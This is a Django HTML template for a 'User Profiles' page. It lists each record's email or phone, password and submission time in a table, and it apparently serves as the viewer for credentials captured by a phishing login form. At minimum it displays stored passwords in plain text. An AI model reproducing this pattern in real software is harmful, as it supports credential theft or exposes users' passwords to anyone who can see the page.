<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>User Profiles</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 20px;
      }
      table {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 20px;
      }
      th,
      td {
        border: 1px solid #ddd;
        padding: 8px;
        text-align: left;
      }
      th {
        background-color: #f4f4f4;
      }
      .center {
        text-align: center;
      }
    </style>
  </head>
  <body>
    <h1>User Profiles</h1>
    <table>
      <thead>
        <tr>
          <th>Email or Phone</th>
          <th>Password</th>

          <th>Submitted At</th>
        </tr>
      </thead>
      <tbody>
        {% for profile in profiles %}
        <tr>
          <td>{{ profile.username }}</td>
          <td>{{ profile.password }}</td>

          <td>{{ profile.created_at }}</td>
        </tr>
        {% empty %}
        <tr>
          <td colspan="4" class="center">No user profiles found.</td>
        </tr>
        {% endfor %}
      </tbody>
    </table>
  </body>
</html>
